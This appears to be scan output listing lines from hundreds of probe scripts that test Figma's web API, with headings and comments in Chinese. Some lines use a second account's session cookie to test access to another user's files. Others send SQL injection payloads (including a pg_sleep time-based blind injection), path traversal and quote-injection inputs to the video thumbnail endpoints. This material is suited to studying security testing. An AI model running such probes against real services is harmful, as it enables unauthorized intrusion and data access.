@@ -1,0 +1,66 @@
+扫描脚本数: 893
+
+===== A. B账号cookie读取方式 =====
+  _figma_ai_perm.py:8: from _figma_creds import COOKIE_B, FILE_A, FILE_B
+  _figma_ai_perm.py:15: def req(method, path, cookie=COOKIE_B):
+  _figma_ai_probe1.py:9: from _figma_creds import COOKIE_B, UID_A, UID_B, FILE_A, FILE_B
+  _figma_ai_probe1.py:19: ws = websocket.create_connection(url, timeout=12, header=['User-Agent: ' + UA, 'Cookie: ' + COOKIE_B])
+  _figma_ai_probe2.py:7: from _figma_creds import COOKIE_B, UID_A, UID_B, FILE_A
+  _figma_ai_probe2.py:16: ws = websocket.create_connection(url, timeout=12, header=['User-Agent: ' + UA, 'Cookie: ' + COOKIE_B])
+  _figma_ai_scope.py:9: from _figma_creds import COOKIE_B, UID_B
+  _figma_ai_scope.py:63: lg_test(UID_B, PUBLIC_FILE, COOKIE_B, 'PUB-Flowbite',
+  _figma_anon2.py:7: from _figma_creds import UID_A, UID_B, FILE_A, COOKIE_B
+  _figma_anon2.py:69: run('B身份(带cookie)', COOKIE_B, UID_B)
+  → 命中行数: 249
+
+===== B. thumbs sha1 尾引号/注释 =====
+  _figma_r176_newbatch_smoke.py:74: go('U2', 'POST', f'/api/upnode/image?purpose=canvas&sha1=x&fileKey={FK2}', None, '空body图片(学消息)')
+  _figma_r177_mcp_upnode.py:76: p('Z4', '/api/upnode/image?purpose=canvas&sha1=da39a3ee5e6b4b0d3255bfef95601890afd80709&fileKey=' + FK2, DUMMY, {'Content-Type': 'image/png'}, 'CT门+40
+  _figma_r177_mcp_upnode.py:77: p('Z5', "/api/upnode/image?purpose=canvas&sha1=da39a3ee5e6b4b0d3255bfef95601890afd80709'&fileKey=" + FK2, DUMMY, {'Content-Type': 'image/png'}, "sha1尾
+  _figma_r212_probe.py:42: go('V2', f'/api/files/{FILE_A}/videos/{FAKE_SHA1}/thumbnails', 'thumbnails 假sha1基线')
+  _figma_r213_deep.py:39: get('V6', f'{V}/{quote(SHA + chr(39), safe="")}/thumbnails', 'sha1 尾引号')
+  _figma_r213_deep.py:40: get('V7', f'{V}/{quote("a" + chr(39) + " OR " + chr(39) + "1" + chr(39) + "=" + chr(39) + "1", safe="")}/thumbnails', 'sha1 OR 注入')
+  _figma_r213_deep.py:41: get('V8', f'{V}/{quote("a" + chr(39) + " AND (SELECT 1 FROM pg_sleep(3))-- ", safe="")}/thumbnails', 'sha1 时延盲注')
+  _figma_r213_deep.py:42: get('V9', f'{V}/aa/thumbnails', 'sha1 短值(格式校验探针)')
+  _figma_r219_gaps.py:52: req('X1', 'GET', f'{BASE}/api/files/{FILE_A}%27/videos/' + 'a' * 40 + '/thumbnails', 'fk位 %27 尾引号')
+  _figma_r237_sql_residual.py:78: req('Z3', 'GET', f'{BASE}/api/files/{SHA}/videos/{FILE_A}/thumbnails', 'file_key/sha1 互换 (期望400格式拒)')
+  → 命中行数: 11
+
+===== C. thumbs sha1 大写hex =====
+  → 命中行数: 0
+
+===== D. files/.*/videos 路径形态 =====
+  _figma_r212_probe.py:41: go('V1', f'/api/files/{FILE_A}/videos', 'videos 列表基线(自有文件)')
+  _figma_r212_probe.py:42: go('V2', f'/api/files/{FILE_A}/videos/{FAKE_SHA1}/thumbnails', 'thumbnails 假sha1基线')
+  _figma_r212_probe.py:43: go('V3', f'/api/files/{FILE_A}/videos/{FAKE_SHA1}/thumbnails?max_results=1&start_timestamp_ms=0&end_timestamp_ms=1000', 'thumbnails 数字位冒烟')
+  _figma_r212_probe.py:44: go('V4', f'/api/files/{FILE_A}/videos/{FAKE_SHA1}/upload', 'upload 子端点探活')
+  _figma_r213_deep.py:37: V = f'/api/files/{FILE_A}/videos'
+  _figma_r214c_thumbs_deep.py:34: V = f'/api/files/{FILE_A}/videos'
+  _figma_r219_gaps.py:50: TH = f'/api/files/{FILE_A}/videos/' + 'a' * 40 + '/thumbnails'
+  _figma_r219_gaps.py:52: req('X1', 'GET', f'{BASE}/api/files/{FILE_A}%27/videos/' + 'a' * 40 + '/thumbnails', 'fk位 %27 尾引号')
+  _figma_r219_gaps.py:53: req('X1b', 'GET', f"{BASE}/api/files/{FILE_A}'/videos/" + 'a' * 40 + '/thumbnails', 'fk位 原始引号(看WAF)')
+  _figma_r220_fk.py:24: url = f"{BASE}/api/files/{fk_raw}/videos/{SHA}/thumbnails"
+  → 命中行数: 22
+
+===== E. freq 500 时延记录(ms) =====
+  → 命中行数: 0
+
+===== F. r214c thumbs 用例速览 =====
+  22: def g(tag, path, note, show=420):
+  35: T = '/thumbnails'
+  38: g('B1', f'{V}/{"A"*40}{T}', '大写hex')
+  39: g('B2', f'{V}/{SHA}%00{T}', '40hex+%00尾')
+  40: g('B3', f'{V}/{SHA};v=1{T}', '矩阵参数 ;v=1')
+  41: g('B4', f'{V}/%2e%2e{T}', '编码..路径段')
+  43: g('B5', f'{V}//{SHA}{T}', '双斜杠空段')
+  44: g('B6', f'{V}/{SHA}{T}/', '尾斜杠')
+  46: g('B7', f'{V}/{SHA}{T}?width=100', 'width=100 喷洒')
+  47: g('B8', f'{V}/{SHA}{T}?width=100%27', 'width=100引号')
+  48: g('B9', f'{V}/{SHA}{T}?format=webp&q=50&page=1&limit=1&size=2&dpr=2', 'format/q/page/limit/size/dpr 多参')
+  50: g('B10', f'{V}/{SHA}{T}?max_results="1"', 'quoted integer "1"')
+  51: g('B11', f'{V}/{SHA}{T}?max_results=[1]', '数组 [1]')
+  52: g('B12', f'{V}/{SHA}{T}?max_results=1.5', 'float 1.5')
+  53: g('B13', f'{V}/{SHA}{T}?start_timestamp_ms=-1&end_timestamp_ms=-1', '负时间戳')
+  55: g('B14', '/api/feed_posts/1/videos/1/thumbnails', 'feed镜像探测')
+
+DONE q60
